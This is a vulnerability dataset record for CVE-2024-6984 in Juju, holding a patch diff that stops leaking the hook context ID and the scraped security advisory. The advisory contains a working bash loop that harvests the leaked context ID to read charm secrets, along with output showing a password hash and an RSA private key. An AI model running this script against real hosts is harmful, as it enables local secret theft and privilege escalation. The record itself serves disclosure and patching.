{
    "CVE-2024-6984": {
        "published_date": "2024-07-29T14:04:05.925Z",
        "patch_commits": [
            {
                "url": "https://github.com/juju/juju/commit/da929676853092a29ddf8d589468cf85ba3efaf2",
                "content": "Merge pull request #17788 from manadart/2.9-do-not-log-hook-context-id\n\nhttps://github.com/juju/juju/pull/17788\n\nFixes a potential exploit where a user can run a bash loop attempting to execute hook tools. \n\nIf running while another hook is executing, we log an error with the context ID, making it possible for the user to then use that ID in a following call successfully.\n\nThis means an unprivileged user can access anything available via a hook tool such as config, relation data and secrets.\n\n## QA steps\n- Bootstrap and deploy ubuntu.\n- In one terminal, run `juju ssh 0`, and be ready to run commands here.\n- In another terminal, run `juju run --unit ubuntu/0 -- sleep 10` to invoke a running hook context.\n- Back in the SSH terminal, run `JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-ubuntu-0/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-ubuntu-0/config-get`.\n- The returned error should not indicate the running context ID:\n`ERROR bad request: wrong context ID; got \"0\"`\n\n## Links\n\n**Jira card:** [JUJU-6394](https://warthogs.atlassian.net/browse/JUJU-6394)\n\n\n\n[JUJU-6394]: https://warthogs.atlassian.net/browse/JUJU-6394?atlOrigin=eyJpIjoiNWRkNTljNzYxNjVmNDY3MDlhMDU5Y2ZhYzA5YTRkZjUiLCJwIjoiZ2l0aHViLWNvbS1KU1cifQ\n\nFilename: worker/uniter/runner/runner.go:\n```\n@@ -108,11 +108,41 @@\ntype Runner interface {\n }\n \n // NewRunnerFunc returns a func used to create a Runner backed by the supplied context and paths.\n-type NewRunnerFunc func(context context.Context, paths context.Paths, remoteExecutor ExecFunc) Runner\n+type NewRunnerFunc func(context context.Context, paths context.Paths, remoteExecutor ExecFunc, options ...Option) Runner\n+\n+// Option is a functional option for NewRunner.\n+type Option func(*options)\n+\n+type options struct {\n+\ttokenGenerator TokenGenerator\n+}\n+\n+// WithTokenGenerator returns an Option that sets the token generator for the\n+// runner.\n+func WithTokenGenerator(tg TokenGenerator) Option {\n+\treturn func(o *options) {\n+\t\to.tokenGenerator = tg\n+\t}\n+}\n+\n+func newOptions() *options {\n+\treturn &options{\n+\t\ttokenGenerator: &tokenGenerator{},\n+\t}\n+}\n \n // NewRunner returns a Runner backed by the supplied context and paths.\n-func NewRunner(context context.Context, paths context.Paths, remoteExecutor ExecFunc) Runner {\n-\treturn &runner{context, paths, remoteExecutor}\n+func NewRunner(context context.Context, paths context.Paths, remoteExecutor ExecFunc, options ...Option) Runner {\n+\topts := newOptions()\n+\tfor _, option := range options {\n+\t\toption(opts)\n+\t}\n+\treturn &runner{\n+\t\tcontext:        context,\n+\t\tpaths:          paths,\n+\t\tremoteExecutor: remoteExecutor,\n+\t\ttokenGenerator: opts.tokenGenerator,\n+\t}\n }\n \n // ExecParams holds all the necessary parameters for ExecFunc.\n\n@@ -152,12 +182,21 @@\nfunc execOnMachine(params ExecParams) (*utilexec.ExecResponse, error) {\n // ExecFunc is the exec func type.\n type ExecFunc func(ExecParams) (*utilexec.ExecResponse, error)\n \n+// TokenGenerator is the interface for generating tokens.\n+type TokenGenerator interface {\n+\t// Generate generates a token based on the remote flag.\n+\t// If remote is false, it returns an empty string. Otherwise, it returns a\n+\t// random token.\n+\tGenerate(remote bool) (string, error)\n+}\n+\n // runner implements Runner.\n type runner struct {\n \tcontext context.Context\n \tpaths   context.Paths\n \t// remoteExecutor executes commands on a remote workload pod for CAAS.\n \tremoteExecutor ExecFunc\n+\ttokenGenerator TokenGenerator\n }\n \n func (runner *runner) logger() loggo.Logger {\n\n@@ -207,14 +246,11 @@\nfunc (runner *runner) RunCommands(commands string, runLocation RunLocation) (*ut\n // runCommandsWithTimeout is a helper to abstract common code between run commands and\n // juju-run as an action\n func (runner *runner) runCommandsWithTimeout(commands string, timeout time.Duration, clock clock.Clock, rMode runMode, abort <-chan struct{}) (*utilexec.ExecResponse, error) {\n-\tvar err error\n-\ttoken := \"\"\n-\tif rMode == runOnRemote {\n-\t\ttoken, err = utils.RandomPassword()\n-\t\tif err != nil {\n-\t\t\treturn nil, errors.Trace(err)\n-\t\t}\n+\ttoken, err := runner.tokenGenerator.Generate(rMode == runOnRemote)\n+\tif err != nil {\n+\t\treturn nil, errors.Trace(err)\n \t}\n+\n \tsrv, err := runner.startJujucServer(token, rMode)\n \tif err != nil {\n \t\treturn nil, err\n\n@@ -387,13 +423,11 @@\nfunc (runner *runner) RunHook(hookName string) (HookHandlerType, error) {\n }\n \n func (runner *runner) runCharmHookWithLocation(hookName, charmLocation string, rMode runMode) (hookHandlerType HookHandlerType, err error) {\n-\ttoken := \"\"\n-\tif rMode == runOnRemote {\n-\t\ttoken, err = utils.RandomPassword()\n-\t\tif err != nil {\n-\t\t\treturn InvalidHookHandler, errors.Trace(err)\n-\t\t}\n+\ttoken, err := runner.tokenGenerator.Generate(rMode == runOnRemote)\n+\tif err != nil {\n+\t\treturn InvalidHookHandler, errors.Trace(err)\n \t}\n+\n \tsrv, err := runner.startJujucServer(token, rMode)\n \tif err != nil {\n \t\treturn InvalidHookHandler, errors.Trace(err)\n\n@@ -719,7 +753,7 @@\nfunc (runner *runner) startJujucServer(token string, rMode runMode) (*jujuc.Serv\n \t// Prepare server.\n \tgetCmd := func(ctxId, cmdName string) (cmd.Command, error) {\n \t\tif ctxId != runner.context.Id() {\n-\t\t\treturn nil, errors.Errorf(\"expected context id %q, got %q\", runner.context.Id(), ctxId)\n+\t\t\treturn nil, errors.Errorf(\"wrong context ID; got %q\", ctxId)\n \t\t}\n \t\treturn jujuc.NewCommand(runner.context, cmdName)\n \t}\n\n@@ -789,3 +823,19 @@\ntype hookProcess struct {\n func (p hookProcess) Pid() int {\n \treturn p.Process.Pid\n }\n+\n+type tokenGenerator struct{}\n+\n+// Generate generates a token based on the remote flag.\n+// If remote is false, it returns an empty string. Otherwise, it returns a\n+// random token.\n+func (t *tokenGenerator) Generate(remote bool) (string, error) {\n+\tif !remote {\n+\t\treturn \"\", nil\n+\t}\n+\ttoken, err := utils.RandomPassword()\n+\tif err != nil {\n+\t\treturn \"\", errors.Trace(err)\n+\t}\n+\treturn token, nil\n+}\n```\n\nFilename: worker/uniter/runner/runner_test.go:\n```\n@@ -21,10 +21,13 @@\nimport (\n \tgc \"gopkg.in/check.v1\"\n \n \t\"github.com/juju/juju/core/model\"\n+\t\"github.com/juju/juju/juju/sockets\"\n+\t\"github.com/juju/juju/testing\"\n \t\"github.com/juju/juju/worker/common/charmrunner\"\n \t\"github.com/juju/juju/worker/uniter/hook\"\n \t\"github.com/juju/juju/worker/uniter/runner\"\n \t\"github.com/juju/juju/worker/uniter/runner/context\"\n+\t\"github.com/juju/juju/worker/uniter/runner/jujuc\"\n \trunnertesting \"github.com/juju/juju/worker/uniter/runner/testing\"\n )\n\n@@ -227,6 +230,7 @@\nfunc (s *RunHookSuite) TestRunHookDispatchingHookHandler(c *gc.C) {\n \n type MockContext struct {\n \tcontext.Context\n+\tid              string\n \tactionData      *context.ActionData\n \tactionDataErr   error\n \tactionParams    map[string]interface{}\n\n@@ -239,6 +243,10 @@\ntype MockContext struct {\n \tmodelType       model.ModelType\n }\n \n+func (ctx *MockContext) Id() string {\n+\treturn ctx.id\n+}\n+\n func (ctx *MockContext) GetLogger(module string) loggo.Logger {\n \treturn loggo.GetLogger(module)\n }\n\n@@ -322,6 +330,85 @@\nfunc (s *RunMockContextSuite) assertRecordedPid(c *gc.C, expectPid int) {\n \tc.Assert(strings.TrimRight(string(content), \"\\r\\n\"), gc.Equals, expectContent)\n }\n \n+func (s *RunMockContextSuite) TestBadContextId(c *gc.C) {\n+\tparams := map[string]interface{}{\n+\t\t\"command\":          \"echo 1\",\n+\t\t\"timeout\":          0,\n+\t\t\"workload-context\": true,\n+\t}\n+\tctx := &MockContext{\n+\t\tid:        \"foo-context\",\n+\t\tmodelType: model.CAAS,\n+\t\tactionData: &context.ActionData{\n+\t\t\tParams: params,\n+\t\t},\n+\t\tactionParams:  params,\n+\t\tactionResults: map[string]interface{}{},\n+\t}\n+\tstart := make(chan struct{})\n+\tdone := make(chan struct{})\n+\tresult := make(chan error)\n+\texecCount := 0\n+\texecFunc := func(params runner.ExecParams) (*exec.ExecResponse, error) {\n+\t\texecCount++\n+\t\tswitch execCount {\n+\t\tcase 1:\n+\t\t\treturn &exec.ExecResponse{}, nil\n+\t\tcase 2:\n+\t\t\tclose(start)\n+\n+\t\t\tselect {\n+\t\t\tcase <-done:\n+\t\t\tcase <-time.After(testing.LongWait):\n+\t\t\t\tc.Fatalf(\"timed out waiting to complete\")\n+\t\t\t}\n+\t\t\treturn &exec.ExecResponse{}, nil\n+\t\t}\n+\t\treturn nil, nil\n+\t}\n+\tgo func() {\n+\t\tdefer close(done)\n+\t\tselect {\n+\t\tcase <-start:\n+\t\tcase <-time.After(testing.LongWait):\n+\t\t\tc.Fatalf(\"timed out waiting to start\")\n+\t\t}\n+\t\tsocket := s.paths.GetJujucServerSocket(false)\n+\n+\t\tclient, err := sockets.Dial(socket)\n+\t\tc.Assert(err, jc.ErrorIsNil)\n+\t\tdefer client.Close()\n+\n+\t\treq := jujuc.Request{\n+\t\t\tContextId:   \"whatever\",\n+\t\t\tDir:         c.MkDir(),\n+\t\t\tCommandName: \"remote\",\n+\t\t}\n+\n+\t\tvar resp exec.ExecResponse\n+\t\terr = client.Call(\"Jujuc.Main\", req, &resp)\n+\n+\t\tgo func() {\n+\t\t\tresult <- err\n+\t\t}()\n+\t}()\n+\t_, err := runner.NewRunner(ctx, s.paths, execFunc, runner.WithTokenGenerator(localTokenGenerator{})).RunAction(\"juju-run\")\n+\tc.Assert(err, jc.ErrorIsNil)\n+\n+\tselect {\n+\tcase err := <-result:\n+\t\tc.Assert(err, gc.ErrorMatches, `.*wrong context ID; got \"whatever\"`)\n+\tcase <-time.After(5 * time.Second):\n+\t\tc.Fatal(\"timed out waiting for jujuc to finish\")\n+\t}\n+}\n+\n+type localTokenGenerator struct{}\n+\n+func (localTokenGenerator) Generate(remote bool) (string, error) {\n+\treturn \"\", nil\n+}\n+\n func (s *RunMockContextSuite) TestRunHookFlushSuccess(c *gc.C) {\n \texpectErr := errors.New(\"pew pew pew\")\n \tctx := &MockContext{\n```\n\nFilename: worker/uniter/util_test.go:\n```\n@@ -551,7 +551,7 @@\nfunc (s startUniter) step(c *gc.C, ctx *testContext) {\n \t\tMachineLock:          processLock,\n \t\tUpdateStatusSignal:   ctx.updateStatusHookTicker.ReturnTimer(),\n \t\tNewOperationExecutor: operationExecutor,\n-\t\tNewProcessRunner: func(context runnercontext.Context, paths runnercontext.Paths, remoteExecutor runner.ExecFunc) runner.Runner {\n+\t\tNewProcessRunner: func(context runnercontext.Context, paths runnercontext.Paths, remoteExecutor runner.ExecFunc, options ...runner.Option) runner.Runner {\n \t\t\tctx.runner.ctx = context\n \t\t\treturn ctx.runner\n \t\t},\n```"
            }
        ],
        "sw_version": "v3.5.2",
        "sw_version_wget": "https://github.com/juju/juju/archive/refs/tags/v3.5.2.zip",
        "description": "An issue was discovered in Juju that resulted in the leak of the sensitive context ID, which allows a local unprivileged attacker to access other sensitive data or relation accessible to the local charm.",
        "sec_adv": [
            {
                "url": "https://github.com/juju/juju/security/advisories/GHSA-6vjm-54vp-mxhx",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njuju\n/\njuju\nPublic\nNotifications You must be signed in to change notification settings\nFork 535\nStar 2.5k\nCode\nIssues\n114\nPull requests\n26\nActions\nSecurity\n5\nInsights\nAdditional navigation options\nUnprivileged user running on charm node can leak any secret or relation data accessible to the local charm\nHigh anvial published GHSA-6vjm-54vp-mxhx on Aug 5, 2024Aug 5, 2024\nPackage\nNo package listed\nAffected versions\n>=3.0, <3.0\nPatched versions\n2.9.50, 3.1.9, 3.3.6, 3.4.5, 3.5.3\nDescription\nSummary\nWhere: on any given node running a charm. Did not try on k8s, but I would imagine that any user on the container OR on the underlying host can also perform this attack.\nCriticality Rationale\nI am setting this issue as critical, as one single compromised host in Juju may give arbitrary access, maybe even remote access, to a target application. Any access to any host would allow a malicious actor to do privilege abuse and escalation in the environment.\nExplanation\nThe permissions on /var/lib/juju/ are too broad and essentially let any unprivileged users leak any secret available on the local charm(s) (Details point 1.).\nFor a demo, I've created an unprivileged user in the host:\nubuntu@juju-a6bfe1-8:~$ sudo mkdir -p /home/unpriv\nubuntu@juju-a6bfe1-8:~$ sudo useradd unpriv_user\nubuntu@juju-a6bfe1-8:~$ sudo chown -R unpriv_user:unpriv_user /home/unpriv\nubuntu@juju-a6bfe1-8:~$ sudo usermod unpriv_user -d /home/unpriv\nubuntu@juju-a6bfe1-8:~$ sudo su - unpriv_user\nOnce under unpriv_user, I've crafted a quick script:\n#!/usr/bin/bash\n\nwhile true; do\n    if [ \"JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids | grep -q 'bad request: expected context id '\" ]; then\n        context_id=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids 2>&1 | awk -F\"\\\"\" '{print $2}')\n        echo $context_id\n        echo \"Now get the secrets:\"\n        secret=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=\"$context_id\" /var/lib/juju/tools/unit-opensearch-4/secret-ids | head -n 1)\n        echo \"Target secret is: $secret\"\n        value=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=\"$context_id\" /var/lib/juju/tools/unit-opensearch-4/secret-get $secret)\n        echo \"$value\"\n    fi\n    sleep 5s\ndone\nWhen executing the script above, I get:\nFirst, the script tries in vain to recover the JUJU_CONTEXT_ID:\nNow get the secrets:\nERROR JUJU_CONTEXT_ID not set\nTarget secret is: \nERROR JUJU_CONTEXT_ID not set\n\n\nNow get the secrets:\nERROR JUJU_CONTEXT_ID not set\nTarget secret is: \nERROR JUJU_CONTEXT_ID not set\nThen, once a hook happens at the host, I can see the context id, that is leaked as part of the error message, and use it to leak any of the secrets available:\nopensearch/4-update-status-6650616701636989502\nNow get the secrets:\nTarget secret is: cqcdo3i8l9fjmtptgrvg\nkibanaserver-password-hash: $2b$12$kFsUqJiAM3fnonenAbOmJ.OJdhAgJjaodbx9ia2V0SCNHTp./r65e\n......\nand it also leaks the private key:\nkey: |\n  -----BEGIN RSA PRIVATE KEY-----\n  MIIEpAIBAAKCAQEAoK4J9n1091bGcQtlFkXFJCOksRq5pcCzeTBjccar2ZdEWCNU\n  UWctZO8r7DU5r4cwNjS9jafouAzmP07dd40LuwN3Uedj1c3+mPPf1AUkTWm/O0tO\n  It/c1+ym/0oTxsdYXI2DWPa5Ni433luXP9myki9P3HZrUDy9FniE2PnOv2u2TIeh\n  3uzsktc/PvbdGkLg5KVnIVC6CmSUAPMim/RGU9KTYL4bTG4aH0zs5d6b13eN7bMI\n  tSwmutUfSyZYcgJbWgAsVIsti8cfcbAEvMUREkCze/FJHJyxrKuctt8Vfo+nPqKF\n  tZe88Mnl2aS+22+D9j2XRCi969jBJKpxN0Y4cwIDAQABAoIBADk/iQEvldsCKdXh\n  D3UuCp1jrawEL5zk2Y0WNng1Jslx4cHdZI9USZIqvOV92T221vCZPegYqQvaXLa1\n  rKaJtGI/S+X8oU9uA4YPbfImmtaSFLZVkFNQm2i7Qoy2ofEy2UKwkNnDnh21veYV\n  kAAJ2lvHS5brAjUmTuCQtBRyfL0qXBQTMACy6PUIgynGm/zP3DxAxCcA2IBhcuEx\n  xHaMwmdQBewR3zW6oOXLyBg10SV9iYhArO7JKRnWJGPpploT2AQu4uH4H3mMWMN5\n  wkT/t084Xpt8wPLmcKB2+B4muQhKhQUuHRXzTeAh1E6h0tPmRRkg9mWQ6VZFHEgi\n  YzivJ8ECgYEA4KH/Doos4m6G1eL587YBbBh/SOklmH5yB83AAMn7wYqYnQ8+qhX/\n  L8uF5u0Pm2v1H09eVGlg66POUPdtwx0QBA0r9i5NfBCVdjGHSdRFxg35MTb0qYBd\n  9E6pCWhrpPWbwKPxgjpqN8iW6Vi0xnKiERj1CIE8fWvlLzDRg6AVpNECgYEAtx3m\n  iF5jW200tyHGEwmneNSwhJ83IXINTpPZA906Wwku8PH2mj4nRbcUCGfqJ5FN8vks\n  R4sH55SL0Ff/E4w5E738PSgdnrF3O5KfHioPSRlKAq08VtDa6Q7msxauTRbqECM9\n  2Vu63WBWBWxH0Q2YZVeG4USFKY0PGslYWqULKgMCgYAWel9pdw4ywlifwoy8hHPz\n  +yeRhjMK5WxHt6EE8zFMFrBa1xGwN29Huxf1Gbe8F7t5nJmV3M2kBso4c+n54kid\n  /yttAQkj5wztvNsK2kD5JqDO+e7Vn1DHh6+Gj3pmEWW6iy05mNrUJjBjvUqpqQLq\n  rxKl/TiuXEOcy0fL4hMIYQKBgQCwdhT5JxRSP4vESrypDe2gSD4On6uuBE2Egn9n\n  9OHOZqwgrtt4yhpoWUPp0dHY7XKTicE89GLarNCLJrF9cexy9OtFOApLKjN/ag0C\n  MX/nboJez/hMpRm/64cv39R6H3HRuVRZyMbrnHFo6m7Oq25HgrBNFw3H+9Ipeww0\n  1cVLZwKBgQC/O1twahHzdP5nbuXBe5vKpiqPaw51y/xAF+z0EFG9gUAfvwqAm5JN\n  4OFpNDlGhkagbSoGffynMvPYYT7qnS+i8bJVL3qWzND4pERVP2bZiQCyN6Pbnnvr\n  jx4p78wx72ZbLGvf2TXWlqRNAUNhs4dJrUf4bqW1bmBVPzRxsGdWJQ==\n  -----END RSA PRIVATE KEY-----\nDetails\n1. File permissions seen from unpriv_user:\nunpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/\ntotal 16\ndrwxr-xr-x 4 root root 4096 Jul 18 09:05 .\ndrwxr-xr-x 7 root root 4096 Jul 18 09:05 ..\ndrwxr-xr-x 2 root root 4096 Jul 18 09:05 machine-8\ndrwxr-xr-x 4 root root 4096 Jul 18 09:05 unit-opensearch-4\nunpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/unit-opensearch-4/\ntotal 20\ndrwxr-xr-x 4 root root 4096 Jul 18 09:05 .\ndrwxr-xr-x 4 root root 4096 Jul 18 09:05 ..\n-rw------- 1 root root 2055 Jul 18 09:05 agent.conf\ndrwxr-xr-x 6 root root 4096 Jul 18 09:39 charm\nsrwx------ 1 root root    0 Jul 18 09:05 metrics-send.socket\nsrwx------ 1 root root    0 Jul 18 09:05 run.socket\ndrwxr-xr-x 4 root root 4096 Jul 18 09:05 state\nunpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/unit-opensearch-4/charm/\ntotal 108\ndrwxr-xr-x  6 root root  4096 Jul 18 09:39 .\ndrwxr-xr-x  4 root root  4096 Jul 18 09:05 ..\n-rw-r--r--  1 root root    25 Jul 18 09:05 .juju-charm\n-rw-------  1 root root 24576 Jul 18 09:39 .unit-state.db\n-rw-r--r--  1 root root 11345 Jul 18 09:05 LICENSE\n-rw-r--r--  1 root root  4370 Jul 18 09:05 README.md\n-rw-r--r--  1 root root  2776 Jul 18 09:05 actions.yaml\n-rw-r--r--  1 root root    10 Jul 18 09:05 charm_version\n-rw-r--r--  1 root root  1713 Jul 18 09:05 config.yaml\n-rwxr-xr-x  1 root root   102 Jul 18 09:05 dispatch\ndrwxr-xr-x  2 root root  4096 Jul 18 09:05 hooks\n-rw-r--r--  1 root root  1127 Jul 18 09:05 icon.svg\ndrwxr-xr-x  3 root root  4096 Jul 18 09:05 lib\n-rw-r--r--  1 root root   250 Jul 18 09:05 manifest.yaml\n-rw-r--r--  1 root root  1404 Jul 18 09:05 metadata.yaml\n-rw-r--r--  1 root root     1 Jul 18 09:06 revision\ndrwxr-xr-x  5 root root  4096 Jul 18 09:06 src\ndrwxr-xr-x 73 root root  4096 Jul 18 09:06 venv\n-rw-r--r--  1 root root     7 Jul 18 09:06 workload_version\nunpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/tools/unit-opensearch-4\nlrwxrwxrwx 1 root root 38 Jul 18 09:05 /var/lib/juju/tools/unit-opensearch-4 -> /var/lib/juju/tools/3.4.4-ubuntu-amd64\nunpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/tools/unit-opensearch-4/\ntotal 199732\ndrwxr-xr-x 2 root root      4096 Jul 18 09:05 .\ndrwxr-xr-x 3 root root      4096 Jul 18 09:05 ..\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 action-fail -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 action-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 action-log -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 action-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 add-metric -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 application-version-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 close-port -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 config-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 credential-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\n-rw-r--r-- 1 root root       229 Jul 18 09:05 downloaded-tools.txt\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 goal-state -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 is-leader -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 juju-log -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 juju-reboot -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\n-rwxrwxr-x 1 root root   4911104 Jun 21 07:12 jujuc\n-rwxr-xr-x 1 root root 199594256 Jun 21 07:17 jujud\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-raw-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-raw-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-spec-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-spec-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 leader-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 leader-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 network-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 open-port -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 opened-ports -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-register -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-status-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-unregister -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 pod-spec-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 pod-spec-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-ids -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-list -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 resource-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-add -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-grant -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-ids -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-info-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-remove -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-revoke -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 state-delete -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 state-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 state-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 status-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 status-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-add -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-list -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nlrwxrwxrwx 1 root root        44 Jul 18 09:05 unit-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc\nPoC\nDeploy any model\nAccess one of the hosts\nRun the script above\nImpact\nIt is easy to have privileged escalation,as secrets will contain sensitive information of any workloads.\nJuju < 3.0\nI also can get relation information from:\n$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=opensearch/4-update-status-6650616701636989502 /var/lib/juju/tools/unit-opensearch-4/relation-ids certificates\ncertificates:11\nHowever, I did not extend the attack to count for this scenario, but I believe it is also doable.\nPotential Solutions\nFirst, we must not leak the JUJU_CONTEXT_ID as part of the error message. That will mean from now on, an user will have \"guess\" that value and it changes every time.\nIn any case, we must also limit the rights within /var/lib/juju to root-only. I cannot see a reason to have it with such wide permissions.\nSeverity\nHigh\n8.8\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2024-6984\nWeaknesses\nCWE-209 CWE-269 CWE-284\nCredits\nphvalguima\nReporter\nmanadart\nRemediation developer\nSimonRichardson\nRemediation reviewer\nhpidcock\nRemediation reviewer\nlucistanescu\nCoordinator\neslerm\nCoordinator\nFooter\nÂ© 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a script and detailed methodology to exploit the vulnerability, ensuring reproducibility."
            }
        ],
        "cwe": [
            {
                "id": "CWE-209",
